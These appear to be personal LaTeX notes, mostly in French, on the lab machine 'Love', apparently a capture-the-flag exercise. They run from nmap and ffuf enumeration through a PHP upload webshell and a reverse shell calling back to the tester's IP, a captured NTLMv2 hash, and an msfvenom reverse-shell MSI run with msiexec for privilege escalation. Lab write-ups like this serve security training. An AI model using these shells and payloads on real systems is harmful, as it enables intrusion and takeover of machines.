\chapter{Love}
\begin{itemize}
    \item {\bf technics}: \gls{t:install-elevated-privesc},
        \gls{t:php-reverse-shell}
    \item {\bf Components}: http,  
    \item {\bf tools}: ffuf, msfvenom, searchsploit
\end{itemize}


\section{Résumé}



\section{Details}

\subsection{nmap}
\begin{verbatim}
PORT     STATE SERVICE      REASON          VERSION
80/tcp   open  http         syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: Voting System using PHP
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
135/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     syn-ack ttl 127 Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in/localityName=norway/emailAddress=roy@love.htb/organizationalUnitName=love.htb
| Issuer: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in/localityName=norway/emailAddress=roy@love.htb/organizationalUnitName=love.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-18T14:00:16
| Not valid after:  2022-01-18T14:00:16
| MD5:   bff0 1add 5048 afc8 b3cf 7140 6e68 5ff6
| SHA-1: 83ed 29c4 70f6 4036 a6f4 2d4d 4cf6 18a2 e9e4 96c2
| -----BEGIN CERTIFICATE-----
...
| 0drwvFE50xML9h2wrGh7L9/CSbhIhO8=
|_-----END CERTIFICATE-----
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds syn-ack ttl 127 Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql?       syn-ack ttl 127
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, HTTPOptions, Help, Kerberos, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:
|_    Host '10.10.16.3' is not allowed to connect to this MariaDB server
| mysql-info:
|_  MySQL Error: Host '10.10.16.3' is not allowed to connect to this MariaDB server
5000/tcp open  http         syn-ack ttl 127 Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.92%I=7%D=9/12%Time=631F72B2%P=x86_64-pc-linux-gnu%r(HT
...
SF:is\x20MariaDB\x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2022-09-12T18:17:44
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 24519/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 46453/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 16662/udp): CLEAN (Failed to receive data)
|   Check 4 (port 21885/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-09-12T11:17:45-07:00
|_clock-skew: mean: 2h41m33s, deviation: 4h02m30s, median: 21m32s

\end{verbatim}

\subsubsection{http}

sur http://staging.love.htb/beta.php si on tappe http://127.0.0.1:5000 on
obtient 

Vote Admin Creds admin: @LoveIsInTheAir!!!!

ne marche pas en login
\begin{verbatim}
$ ffuf -u http://www.love.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ -e php

ADMIN                   [Status: 301, Size: 337, Words: 22, Lines: 10, Duration: 79ms]
Admin                   [Status: 301, Size: 337, Words: 22, Lines: 10, Duration: 82ms]
Images                  [Status: 301, Size: 338, Words: 22, Lines: 10, Duration: 63ms]
admin                   [Status: 301, Size: 337, Words: 22, Lines: 10, Duration: 67ms]

$ ffuf -u http://www.love.htb/admin/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -e .php
login.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 102ms]
home.php                [Status: 302, Size: 16257, Words: 3666, Lines: 413, Duration: 81ms]
print.php               [Status: 302, Size: 397, Words: 45, Lines: 5, Duration: 307ms]
Home.php                [Status: 302, Size: 16257, Words: 3666, Lines: 413, Duration: 80ms]
includes                [Status: 301, Size: 346, Words: 22, Lines: 10, Duration: 97ms]
Index.php               [Status: 200, Size: 6198, Words: 767, Lines: 170, Duration: 69ms]
Login.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 92ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 78ms]


\end{verbatim}

en recherchant sur searchsploit on trouve des trucs

\begin{verbatim}
searchsploit voting system
[i] Found (#2): /opt/exploit-database/files_exploits.csv
[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)

[i] Found (#2): /opt/exploit-database/files_shellcodes.csv
[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)

----------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                           |  Path
----------------------------------------------------------------------------------------- ---------------------------------
Online Voting System 1.0 - Authentication Bypass (SQLi)                                  | php/webapps/50075.txt
Online Voting System 1.0 - Remote Code Execution (Authenticated)                         | php/webapps/50076.txt
Online Voting System 1.0 - SQLi (Authentication Bypass) + Remote Code Execution (RCE)    | php/webapps/50088.py
Online Voting System - Authentication Bypass                                             | php/webapps/43967.py
Online Voting System Project in PHP - 'username' Persistent Cross-Site Scripting         | multiple/webapps/49159.txt
Voting System 1.0 - Authentication Bypass (SQLI)                                         | php/webapps/49843.txt
Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)                | php/webapps/49445.py
Voting System 1.0 - Remote Code Execution (Unauthenticated)                              | php/webapps/49846.txt
Voting System 1.0 - Time based SQLI (Unauthenticated SQL injection)                      | php/webapps/49817.txt
WordPress Plugin Poll_ Survey_ Questionnaire and Voting system 1.5.2 - 'date_answers' Bl | php/webapps/50052.txt
----------------------------------------------------------------------------------------- ---------------------------------
\end{verbatiim}

\begin{verbatim}
searchsploit -x 49846
\end{verbatim}

visiblement en uploadant sur l'image d'ajout d'un candidat un php il s'execute
et on peut le retrouver dans \verb+./images/shell.php+

on test \verb+<?php echo exec($_GET["cmd"]); ?>+

on peut donc crafter un revershell avec \url{https://www.revshells.com/}

\verb+<?php $sock=fsockopen("10.10.16.3",4444);shell_exec("powershell <&3 >&3 2>&3");; ?>+

on recoit un shell qui kill direct

on essaye laudanum sans succes

wwwolf-php-webshell semble passer

on peut upload un \verb+nc+ 

\begin{verbatim}

$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.239 51760
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\omrs\images>whoami
whoami
love\phoebe
\end{verbatim}

\begin{verbatim}
[SMB] NTLMv2-SSP Client   : 10.10.10.239
[SMB] NTLMv2-SSP Username : LOVE\Phoebe
[SMB] NTLMv2-SSP Hash     : Phoebe::LOVE:94bf1e577d521029:30D459CF7F537700E3B557579E08FEE9:010100000000000000CC3619EDC6D801F6BE7D4DD276F66700000000020008004D00430047004B0001001E00570049004E002D004700340048005900540054003000320034004D00570004003400570049004E002D004700340048005900540054003000320034004D0057002E004D00430047004B002E004C004F00430041004C00030014004D00430047004B002E004C004F00430041004C00050014004D00430047004B002E004C004F00430041004C000700080000CC3619EDC6D801060004000200000008003000300000000000000000000000002000004EE4F64CC60BF93967BA632BD4BFA00F558DC96318F6B6FB1AD7A210B675DCA50A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0033000000000000000000
[*] Skipping previously captured hash for LOVE\Phoebe
[*] Skipping previously captured hash for LOVE\Phoebe
\end{verbatim}

a priori on ne peut rien en faire


bon on upload un winpeas.bat

il passe mais plante sur la lecture des registres.


\begin{verbatim}
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$ msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=10.10.16.3 LPORT=5555 -f msi -o reverse.msi

 msiexec /i c:\Administration\reverse.msi /quiet /norestart /qn
\end{verbatim}


\section{Theorie}


